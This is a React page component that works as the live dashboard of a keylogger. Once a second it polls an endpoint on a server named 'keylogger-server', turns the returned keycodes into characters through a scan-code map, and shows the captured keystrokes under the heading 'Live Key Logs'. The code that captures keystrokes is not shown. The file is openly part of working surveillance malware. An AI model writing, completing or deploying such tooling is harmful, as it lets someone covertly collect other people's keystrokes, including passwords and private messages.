import { useEffect, useState } from "react";

export default function Home() {
  const [keys, setKeys] = useState([]);

  // Decode keycode to readable key value
  const decodeKey = (code) => {
  const keyMap = {
    1: "Esc",
    2: "1", 3: "2", 4: "3", 5: "4",
    6: "5", 7: "6", 8: "7", 9: "8", 10: "9", 11: "0",
    13: "=", 14: "Backspace", 15: "Tab",
    16: "q", 17: "w", 18: "e", 19: "r", 20: "t",
    21: "y", 22: "u", 23: "i", 24: "o", 25: "p",
    28: "Enter", 29: "L Ctrl",
    30: "a", 31: "s", 32: "d", 33: "f", 34: "g",
    35: "h", 36: "j", 37: "k", 38: "l",
    39: ";", 40: "'", 41: "`",
    42: "L Shift", 44: "z", 45: "x", 46: "c", 47: "v",
    48: "b", 49: "n", 50: "m",
    52: ".", 57: "Space",
    58: "CapsLock", 69: "NumLock",
    79: "1", 80: "2", 81: "3" ,
    75: "4", 76: "5",77: "6", 
    71: "7", 72: "8", 73: "9",
    82: "0", 96: "Enter",
    12: "-", 13:"="
  };

  return keyMap[code] || `[${code}]`;
};

  useEffect(() => {
    const fetchKeys = async () => {
      try {
        const res = await fetch("https://keylogger-server-harimks-projects.vercel.app/api/data");
        const json = await res.json();
        setKeys(json);
      } catch (err) {
        console.error("Fetch error:", err);
      }
    };

    fetchKeys();
    const interval = setInterval(fetchKeys, 1000);
    return () => clearInterval(interval);
  }, []);

  return (
    <div
      style={{
        backgroundColor: "white",
        color: "#222",
        height: "100vh",
        padding: "2rem",
        fontFamily: "monospace",
        overflowWrap: "break-word",
        fontSize: "1.5rem",
      }}
    >
      <h1 style={{ marginBottom: "1rem" }}>Live Key Logs</h1>
      <div>
        {keys.map((k, i) => decodeKey(k)).join("")}
      </div>
    </div>
  );
}
